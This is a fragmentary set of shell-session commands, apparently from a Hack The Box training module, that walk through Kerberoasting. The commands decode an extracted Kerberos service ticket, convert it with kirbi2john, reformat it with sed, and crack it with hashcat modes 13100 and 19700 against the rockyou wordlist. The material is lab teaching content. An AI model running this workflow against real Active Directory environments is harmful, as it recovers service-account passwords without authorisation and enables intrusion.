...
```shell-session
trmchale@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
...
```shell-session
trmchale@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```
...
```shell-session
trmchale@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```
...
```shell-session
trmchale@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
...
```shell-session
trmchale@htb[/htb]$ cat sqldev_tgs_hashcat 
...
```shell-session
trmchale@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
...
```shell-session
trmchale@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
...
```shell-session
trmchale@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
